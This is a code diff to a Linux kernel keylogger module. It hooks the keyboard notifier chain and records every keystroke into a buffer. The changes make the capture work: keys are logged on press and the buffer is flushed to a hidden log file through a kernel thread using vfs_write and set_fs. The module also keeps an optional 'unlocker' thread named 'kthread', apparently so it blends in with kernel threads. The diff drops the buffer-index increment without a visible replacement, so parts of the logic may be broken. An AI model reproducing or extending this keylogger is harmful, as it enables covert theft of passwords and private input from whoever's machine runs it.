@@ -2,6 +2,7 @@
 #include "keylog.h"
 #include <linux/keyboard.h>
 #include <linux/kthread.h>
+#include <linux/uaccess.h>
 
 #if defined(_CONFIG_UNLOCK_)
 struct task_struct *unlock_ts;
@@ -46,6 +47,8 @@ static void ksym_std ( struct keyboard_notifier_param *param, char *buf )
 {
     unsigned char val = param->value & 0xff;
     unsigned long len;
+
+    DEBUG_KEY("%s: Logging key '%s'\n", __func__, ascii[val]);
 
     len = strlcpy(&logbuf[logidx], ascii[val], LOGSIZE - logidx);
 
@@ -100,6 +103,8 @@ void translate_keysym ( struct keyboard_notifier_param *param, char *buf )
 {
     unsigned char type = (param->value >> 8) & 0x0f;
 
+    DEBUG_KEY("Translating keysym %u, BEFORE: logidx=%lu, FLUSHSIZE=%u, LOGSIZE=%u\n", param->value, logidx, FLUSHSIZE, LOGSIZE);
+
     if ( logidx >= LOGSIZE )
     {
         DEBUG("KEYLOGGER: Failed to log key, buffer is full\n");
@@ -141,9 +146,9 @@ void translate_keysym ( struct keyboard_notifier_param *param, char *buf )
             break;
     }
 
-    logidx++;
+    DEBUG_KEY("AFTER keysym translate: logidx=%lu, logbuf=%s\n", logidx, logbuf);
 
-    if ( logidx == FLUSHSIZE )
+    if ( logidx >= FLUSHSIZE && to_flush == 0 )
     {
         DEBUG("Keylog buffer is near full, flush to file\n");
 
@@ -154,13 +159,30 @@ void translate_keysym ( struct keyboard_notifier_param *param, char *buf )
 
 int flusher ( void *data )
 {
+    loff_t pos = 0;
+    mm_segment_t old_fs;
+    ssize_t ret;
+
     while ( 1 )
     {
         wait_event_interruptible(flush_event, (to_flush == 1));
 
         DEBUG("Inside the flusher thread, flush keylog buffer to file\n");
 
+        if ( logfile )
+        {
+            old_fs = get_fs();
+            set_fs(get_ds());
+
+            ret = vfs_write(logfile, logbuf, logidx, &pos);
+
+            set_fs(old_fs);
+
+            DEBUG("vfs_write ret=%d\n", ret);
+        }
+
         to_flush = 0;
+        logidx = 0;
 
         if ( kthread_should_stop() )
             break;
@@ -178,7 +200,7 @@ int notify ( struct notifier_block *nblock, unsigned long code, void *_param )
 
     #if defined(_CONFIG_LOGFILE_)
     /* Only log if there is a logfile and the key is pressed down */
-    if ( logfile && ! param->down )
+    if ( logfile && param->down )
     {
         switch ( code )
         {
@@ -261,7 +283,7 @@ void keylogger_init ( void )
     unlock_ts = kthread_run(unlocker, NULL, "kthread");
     #endif
     #if defined(_CONFIG_LOGFILE_)
-    logfile = filp_open(LOG_FILE, O_APPEND|O_CREAT, S_IRWXU);
+    logfile = filp_open(LOG_FILE, O_WRONLY|O_APPEND|O_CREAT, S_IRWXU);
     if ( ! logfile )
         DEBUG("KEYLOGGER: Failed to open log file: %s", LOG_FILE);
 
